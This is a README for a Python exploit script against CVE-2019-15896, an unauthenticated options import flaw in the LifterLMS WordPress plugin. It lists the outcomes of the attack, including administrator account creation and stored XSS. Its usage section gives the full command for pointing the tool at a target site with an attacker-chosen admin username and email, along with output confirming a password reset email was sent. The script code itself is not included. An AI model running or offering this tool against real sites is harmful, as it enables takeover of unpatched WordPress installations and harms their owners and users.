# CVE-2019-15896
LifterLMS &lt;= 3.34.5 - Unauthenticated Options Import

# Description

Unauthenticated Options Import, which could lead to 

- Website Redirection

- Administrator Account Creation

- Content Injection

- Stored XSS

The issues have been reported as fixed in 3.35.0. However v3.35.1 added additional input sanitisation and filtering.


How to use
---
$ python3 CVE-2019-15896.py --url http://wordpress.lan --username radmin --email admin@admin.lan
LifterLMS <= 3.34.5 - Unauthenticated Options Import
Exploit By Ramdom Robbie
Once ran check your email for the forgotten password link.
Password reset email sent to admin@admin.lan
```

Info
---

```
Requires access to login.php and working email address and the site needs to be able to send emails
```
